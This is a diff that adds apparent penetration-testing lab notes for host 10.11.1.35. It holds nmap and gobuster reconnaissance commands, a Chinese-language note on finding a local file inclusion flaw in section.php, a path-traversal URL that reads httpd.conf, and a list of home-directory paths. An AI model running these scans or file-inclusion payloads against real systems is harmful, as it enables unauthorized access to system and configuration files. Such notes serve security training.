@@ -1,0 +1,24 @@
+nmap -sV -sC -Pn 10.11.1.35 > nmap.txt
+nmap -p- 10.11.1.35 > nmapall.txt
+gobuster dir  -u http://10.11.1.35/  -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x txt,php,cgi > gobuster.txt
+gobuster dir  -u http://10.11.1.35/files  -w /usr/share/dirb/wordlists/common.txt -x txt,php,cgi > gobusterfile.txt
+gobuster dir -u http://10.11.1.35/cgi-bin/  -w /usr/share/dirb/wordlists/vulns/cgis.txt   -s '200,204,301,302,307,401' -e >cgi.txt
+
+
+
+1.nmap掃描發現80端口,直接網頁登入,F12發現請求section.php?後面待參數,嘗試/etc/passwd發現有LFI漏洞
+view-source:http://10.11.1.35/section.php?page=../../..//etc/httpd/conf/httpd.conf
+
+
+~/.bin/
+~/audio/
+~/dev/
+~/docs/
+~/documents/
+~/downloads/
+~/games/
+~/mail/
+~/pics/
+~/share/
+~/tmp/
+~/vm/
